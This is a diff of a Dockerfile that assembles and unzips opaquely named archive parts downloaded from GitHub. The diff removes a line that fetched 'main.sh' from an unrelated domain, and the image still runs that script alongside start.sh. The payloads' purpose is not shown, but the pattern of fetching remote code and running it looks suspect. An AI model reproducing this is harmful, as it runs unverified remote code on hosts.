@@ -10,9 +10,8 @@ RUN wget https://github.com/OliveiraHg/diegopuxada/raw/main/aa https://github.co
 RUN cat a* > renderbfanarrowx.zip
 RUN unzip renderbfanarrowx.zip
 RUN rm -rf renderbfanarrowx.zip
-RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh
 COPY . .
-RUN chmod +x ./main.sh
-RUN chmod +x ./start.sh
+RUN chmod +x main.sh
+RUN chmod +x start.sh
 EXPOSE 5000 3000
-CMD ["sh", "-c", "./start.sh & ./main.sh"]
+CMD ["sh", "-c", "start.sh & main.sh"]
